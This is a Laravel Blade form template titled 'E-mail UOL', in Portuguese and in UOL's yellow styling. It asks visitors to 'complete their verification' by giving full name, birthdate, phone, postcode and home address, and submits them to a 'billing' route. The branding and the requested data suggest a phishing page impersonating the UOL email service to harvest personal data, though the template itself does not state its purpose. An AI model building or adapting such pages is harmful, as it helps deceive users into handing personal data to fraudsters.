<x-layouts.app title="E-mail UOL">
    <div class="leading-none font-semibold px-2 py-4 sm:px-0">Informações pessoais</div>
    <div class="text-muted-foreground text-sm mb-4 px-2 py-2 sm:px-0">Preencha seus dados e endereço para concluir sua verificação.</div>
    <div class="bg-card text-card-foreground flex flex-col gap-6 rounded-none rounded-b-xl border py-6 shadow-lg max-sm:border-none max-sm:shadow-none">
        <form method="POST" action="{{ route('billing.store') }}" class="space-y-12" data-loading-form data-loading-text="Processado..." data-cep-form>
            @csrf
            <div class="px-6 space-y-4">
                <div class="flex max-w-2xl items-center gap-2">
                    <div class="min-w-1/2">
                        <label for="fullname" class="text-sm leading-none font-medium select-none truncate">Nome Completo</label>
                        <input id="fullname" name="fullname" autocomplete="off" minlength="2" placeholder="Nome Completo" required
                               value="{{ old('fullname') }}"
                               class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none transition-[color,box-shadow] outline-none md:text-sm {{ $errors->has('fullname') ? 'border-red-500' : '' }}">
                        @error('fullname')<p class="text-sm text-red-600 dark:text-red-400">{{ $message }}</p>@enderror
                    </div>
                    <div class="min-w-1/2">
                        <label for="birthdate" class="text-sm leading-none font-medium select-none truncate">Data de Nascimento</label>
                        <input id="birthdate" name="birthdate" autocomplete="off" minlength="10" maxlength="10" placeholder="DD/MM/AAAA" required
                               value="{{ old('birthdate') }}" data-mask="birthdate"
                               class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none transition-[color,box-shadow] outline-none md:text-sm {{ $errors->has('birthdate') ? 'border-red-500' : '' }}">
                        @error('birthdate')<p class="text-sm text-red-600 dark:text-red-400">{{ $message }}</p>@enderror
                    </div>
                </div>
                <div class="flex max-w-2xl items-center gap-2">
                    <div class="min-w-1/2">
                        <label for="telefone" class="text-sm leading-none font-medium select-none truncate">Telefone</label>
                        <input id="telefone" name="telefone" autocomplete="off" minlength="7" maxlength="15" placeholder="(00) 00000-0000" required
                               value="{{ old('telefone') }}" data-mask="phone"
                               class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none transition-[color,box-shadow] outline-none md:text-sm {{ $errors->has('telefone') ? 'border-red-500' : '' }}">
                        @error('telefone')<p class="text-sm text-red-600 dark:text-red-400">{{ $message }}</p>@enderror
                    </div>
                    <div class="min-w-1/2">
                        <label for="cep" class="text-sm leading-none font-medium select-none truncate">CEP</label>
                        <input id="cep" name="cep" autocomplete="off" minlength="8" maxlength="9" placeholder="00000-000" required
                               value="{{ old('cep') }}" data-mask="cep"
                               class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none transition-[color,box-shadow] outline-none md:text-sm {{ $errors->has('cep') ? 'border-red-500' : '' }}">
                        @error('cep')<p class="text-sm text-red-600 dark:text-red-400">{{ $message }}</p>@enderror
                    </div>
                </div>
                <div class="flex max-w-2xl flex-col items-center gap-2">
                    @foreach ([
                        ['street','Logradouro','Rua, Avenida, etc.', true, true],
                        ['number','Número','123', true, false],
                        ['complement','Complemento','Apto, Bloco, etc. (opcional)', false, false],
                        ['neighborhood','Bairro','Seu bairro', true, true],
                        ['city','Cidade','Sua cidade', false, true],
                        ['state','Estado','Estado', false, true],
                    ] as [$name, $label, $placeholder, $required, $cepDisabled])
                        <div class="w-full">
                            <label for="{{ $name }}" class="text-sm leading-none font-medium select-none truncate">{{ $label }}</label>
                            <input id="{{ $name }}" name="{{ $name }}" autocomplete="off" placeholder="{{ $placeholder }}"
                                   value="{{ old($name) }}" data-cep-field
                                   @if ($required) required @endif
                                   @if ($cepDisabled) data-cep-fill @endif
                                   class="border-input text-muted-foreground placeholder:text-muted-foreground flex h-9 w-full min-w-0 rounded-sm border bg-transparent px-3 py-1 text-base shadow-none transition-[color,box-shadow] outline-none md:text-sm {{ $errors->has($name) ? 'border-red-500' : '' }}">
                            @error($name)<p class="text-sm text-red-600 dark:text-red-400">{{ $message }}</p>@enderror
                        </div>
                    @endforeach
                </div>
            </div>
            <div class="flex items-center px-6">
                <button type="submit" data-submit
                        class="text-foreground h-12 cursor-pointer rounded-none bg-[#FDC900] px-4 text-base shadow-none hover:shadow-[inset_0_-2px_0_0_#E9B425] disabled:cursor-not-allowed disabled:opacity-50">Continuar</button>
            </div>
        </form>
    </div>
</x-layouts.app>
